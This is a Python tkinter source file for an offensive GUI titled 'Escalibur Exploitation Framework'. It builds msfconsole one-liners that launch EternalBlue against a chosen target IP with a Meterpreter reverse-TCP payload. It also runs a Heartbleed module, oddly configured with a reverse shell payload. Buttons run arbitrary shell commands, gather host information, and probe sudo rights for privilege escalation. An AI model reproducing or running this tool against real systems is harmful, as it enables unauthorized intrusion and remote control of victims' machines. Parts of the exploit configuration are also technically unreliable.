import subprocess
import os
import tkinter as tk
from tkinter import messagebox, scrolledtext, simpledialog
from PIL import Image, ImageTk

target_ip = None
exploit_map = {
    "eternalblue": {
        "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {}; set payload windows/meterpreter/reverse_tcp; set LHOST {}; exploit'"
    },
    "heartbleed": {
        "command": "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {}; set payload generic/shell_reverse_tcp; set LHOST {}; exploit'"
    }
}

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode().strip()  # Strip newline characters from the output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode().strip()}"  # Capture and return error output

def list_files(directory="."):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Directory '{directory}' not found."
    except PermissionError:
        return f"Permission denied to access '{directory}'."

def show_system_info():
    try:
        uname = execute_command("uname -a")
        hostname = execute_command("hostname")
        ip_address = execute_command("hostname -I")
        return f"Hostname: {hostname}\nIP Address: {ip_address}\nSystem Info: {uname}"
    except Exception as e:
        return str(e)

def escalate_privileges():
    try:
        if os.getuid() != 0:
            return execute_command("sudo -l")
        else:
            return "Already running with root privileges."
    except Exception as e:
        return str(e)

def show_exploits():
    exploit_info = "Available Exploits:\n"
    for exploit in exploit_map.keys():
        exploit_info += f" - {exploit}\n"
    return exploit_info.strip()

def run_exploit(exploit_name):
    global target_ip
    exploit = exploit_map.get(exploit_name.lower())
    if exploit:
        if target_ip:
            lhost = simpledialog.askstring("Input", "Enter your local IP address:")
            if lhost:
                command = exploit["command"].format(target_ip, lhost)
                output = execute_command(command)
                messagebox.showinfo("Output", output)
            else:
                messagebox.showwarning("Warning", "Local IP address cannot be empty.")
        else:
            messagebox.showwarning("Warning", "Target IP not set. Use 'Set IP' to set the target IP.")
    else:
        messagebox.showerror("Error", f"Exploit '{exploit_name}' not found.")

def connect_to_ip():
    global target_ip
    target_ip = simpledialog.askstring("Input", "Enter IP Address to connect:")
    if target_ip:
        messagebox.showinfo("Info", f"Connected to {target_ip}")
    else:
        messagebox.showwarning("Warning", "IP Address cannot be empty.")

def set_target_ip():
    global target_ip
    target_ip = simpledialog.askstring("Input", "Enter IP Address:")
    if target_ip:
        messagebox.showinfo("Info", f"Target IP set to {target_ip}")
    else:
        messagebox.showwarning("Warning", "IP Address cannot be empty.")

def main():
    root = tk.Tk()
    root.title("Escalibur Exploitation Framework")
    root.configure(bg="#212121")

    menu_bar = tk.Menu(root)
    root.config(menu=menu_bar)

    file_menu = tk.Menu(menu_bar, tearoff=0)
    menu_bar.add_cascade(label="File", menu=file_menu)
    file_menu.add_command(label="Exit", command=root.quit)

    main_frame = tk.Frame(root, bg="#212121")
    main_frame.pack(padx=10, pady=10)

    text_area = scrolledtext.ScrolledText(main_frame, width=60, height=20, bg="#2c2c2c", fg="#ffffff")
    text_area.grid(row=0, column=0, columnspan=3, pady=(0, 10))

    def execute_command_gui():
        command = simpledialog.askstring("Input", "Enter command to execute:")
        if command:
            output = execute_command(command)
            text_area.insert(tk.END, f"\n{output}")

    def list_files_gui():
        directory = simpledialog.askstring("Input", "Enter directory (leave blank for current directory):")
        if directory is not None:
            output = list_files(directory)
            text_area.insert(tk.END, f"\n{output}")

    def show_system_info_gui():
        output = show_system_info()
        text_area.insert(tk.END, f"\n{output}")

    def escalate_privileges_gui():
        output = escalate_privileges()
        text_area.insert(tk.END, f"\n{output}")

    def show_exploits_gui():
        output = show_exploits()
        text_area.insert(tk.END, f"\n{output}")

    def run_exploit_gui():
        exploit_name = simpledialog.askstring("Input", "Enter exploit name:")
        if exploit_name:
            run_exploit(exploit_name)

    def button_hover_on(event):
        event.widget.config(bg="#333333")

    def button_hover_off(event):
        event.widget.config(bg="#2c2c2c")

    execute_image = Image.open("execute.png")
    execute_image = execute_image.resize((30, 30), Image.ANTIALIAS)
    execute_icon = ImageTk.PhotoImage(execute_image)

    execute_button = tk.Button(main_frame, image=execute_icon, command=execute_command_gui, bg="#2c2c2c",
                               activebackground="#333333", borderwidth=0)
    execute_button.image = execute_icon
    execute_button.grid(row=1, column=0, padx=5, pady=5)
    execute_button.bind("<Enter>", button_hover_on)
    execute_button.bind("<Leave>", button_hover_off)

    list_files_image = Image.open("list_files.png")
    list_files_image = list_files_image.resize((30, 30), Image.ANTIALIAS)
    list_files_icon = ImageTk.PhotoImage(list_files_image)

    list_files_button = tk.Button(main_frame, image=list_files_icon, command=list_files_gui, bg="#2c2c2c",
                                  activebackground="#333333", borderwidth=0)
    list_files_button.image = list_files_icon
    list_files_button.grid(row=1, column=1, padx=5, pady=5)
    list_files_button.bind("<Enter>", button_hover_on)
    list_files_button.bind("<Leave>", button_hover_off)

    system_info_image = Image.open("system_info.png")
    system_info_image = system_info_image.resize((30, 30), Image.ANTIALIAS)
    system_info_icon = ImageTk.PhotoImage(system_info_image)

    system_info_button = tk.Button(main_frame, image=system_info_icon, command=show_system_info_gui, bg="#2c2c2c",
                                   activebackground="#333333", borderwidth=0)
    system_info_button.image = system_info_icon
    system_info_button.grid(row=1, column=2, padx=5, pady=5)
    system_info_button.bind("<Enter>", button_hover_on)
    system_info_button.bind("<Leave>", button_hover_off)

    escalate_privileges_image = Image.open("escalate_privileges.png")
    escalate_privileges_image = escalate_privileges_image.resize((30, 30), Image.ANTIALIAS)
    escalate_privileges_icon = ImageTk.PhotoImage(escalate_privileges_image)

    escalate_privileges_button = tk.Button(main_frame, image=escalate_privileges_icon, command=escalate_privileges_gui,
                                           bg="#2c2c2c", activebackground="#333333", borderwidth=0)
    escalate_privileges_button.image = escalate_privileges_icon
    escalate_privileges_button.grid(row=2, column=0, padx=5, pady=5)
    escalate_privileges_button.bind("<Enter>", button_hover_on)
    escalate_privileges_button.bind("<Leave>", button_hover_off)

    show_exploits_image = Image.open("show_exploits.png")
    show_exploits_image = show_exploits_image.resize((30, 30), Image.ANTIALIAS)
    show_exploits_icon = ImageTk.PhotoImage(show_exploits_image)

    show_exploits_button = tk.Button(main_frame, image=show_exploits_icon, command=show_exploits_gui, bg="#2c2c2c",
                                     activebackground="#333333", borderwidth=0)
    show_exploits_button.image = show_exploits_icon
    show_exploits_button.grid(row=2, column=1, padx=5, pady=5)
    show_exploits_button.bind("<Enter>", button_hover_on)
    show_exploits_button.bind("<Leave>", button_hover_off)

    run_exploit_image = Image.open("run_exploit.png")
    run_exploit_image = run_exploit_image.resize((30, 30), Image.ANTIALIAS)
    run_exploit_icon = ImageTk.PhotoImage(run_exploit_image)

    run_exploit_button = tk.Button(main_frame, image=run_exploit_icon, command=run_exploit_gui, bg="#2c2c2c",
                                   activebackground="#333333", borderwidth=0)
    run_exploit_button.image = run_exploit_icon
    run_exploit_button.grid(row=2, column=2, padx=5, pady=5)
    run_exploit_button.bind("<Enter>", button_hover_on)
    run_exploit_button.bind("<Leave>", button_hover_off)

    connect_image = Image.open("connect.png")
    connect_image = connect_image.resize((30, 30), Image.ANTIALIAS)
    connect_icon = ImageTk.PhotoImage(connect_image)

    connect_button = tk.Button(main_frame, image=connect_icon, command=connect_to_ip, bg="#2c2c2c",
                               activebackground="#333333", borderwidth=0)
    connect_button.image = connect_icon
    connect_button.grid(row=3, column=0, padx=5, pady=5)
    connect_button.bind("<Enter>", button_hover_on)
    connect_button.bind("<Leave>", button_hover_off)

    set_ip_image = Image.open("set_ip.png")
    set_ip_image = set_ip_image.resize((30, 30), Image.ANTIALIAS)
    set_ip_icon = ImageTk.PhotoImage(set_ip_image)

    set_ip_button = tk.Button(main_frame, image=set_ip_icon, command=set_target_ip, bg="#2c2c2c",
                              activebackground="#333333", borderwidth=0)
    set_ip_button.image = set_ip_icon
    set_ip_button.grid(row=3, column=1, padx=5, pady=5)
    set_ip_button.bind("<Enter>", button_hover_on)
    set_ip_button.bind("<Leave>", button_hover_off)

    root.mainloop()

if __name__ == "__main__":
    main()
